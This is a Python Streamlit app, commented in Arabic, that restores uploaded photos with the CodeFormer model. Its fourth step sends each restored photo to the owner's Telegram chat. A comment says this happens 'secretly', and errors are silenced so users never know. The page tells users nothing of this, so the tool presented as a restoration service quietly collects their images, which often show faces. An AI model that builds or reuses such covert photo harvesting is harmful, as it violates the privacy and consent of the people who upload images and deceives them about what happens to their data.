import streamlit as st
from gradio_client import Client, handle_file
import telebot
import os
from PIL import Image

# إعدادات الصفحة
st.set_page_config(page_title="Aziz Ultra Vision", layout="centered")
st.title("🌟 Aziz Ultra Vision")

# جلب بيانات التليجرام
TOKEN = st.secrets["TELEGRAM_TOKEN"]
CHAT_ID = st.secrets["CHAT_ID"]
bot = telebot.TeleBot(TOKEN)

uploaded_file = st.file_uploader("ارفع الصورة هنا للترميم...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    image = Image.open(uploaded_file)
    st.image(image, caption="الصورة الأصلية", use_container_width=True)
    
    if st.button("🚀 بدء الترميم"):
        with st.spinner("جاري العمل..."):
            try:
                # 1. تجهيز الصورة (تصغير الحجم لضمان القبول)
                max_size = 1500
                if max(image.size) > max_size:
                    image.thumbnail((max_size, max_size), Image.Resampling.LANCZOS)
                
                temp_path = "temp_input.png"
                image.save(temp_path)
                
                # 2. استدعاء المحرك
                client = Client("sczhou/CodeFormer")
                result = client.predict(
                    image=handle_file(temp_path),
                    background_enhance=True,
                    face_upsample=True,
                    upscale=2
                )
                
                # تنقية النتيجة (أول صورة في القائمة)
                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                
                # 3. عرض النتيجة في الموقع
                st.image(restored_path, caption="✅ تم الترميم بجودة فائقة", use_container_width=True)

                # 4. الإرسال للتليجرام (سرّاً وبدون رسائل خطأ)
                try:
                    with open(restored_path, "rb") as f:
                        bot.send_photo(CHAT_ID, f, caption="🔥 صورة جديدة جاهزة يا عزيز!")
                except Exception:
                    # في حال فشل الإرسال، الكود يظل صامتاً ولا يزعج المستخدم
                    pass
                
                # تنظيف الملفات
                if os.path.exists(temp_path):
                    os.remove(temp_path)
                
            except Exception as e:
                st.error("المعذرة، السيرفر مشغول حالياً. حاول مرة أخرى.")

# إخفاء أي رسائل خطأ تظهر من المكتبات الخارجية (لأناقة الموقع)
st.markdown("""
    <style>
    .stAlert { margin-top: 10px; }
    </style>
    """, unsafe_allow_html=True)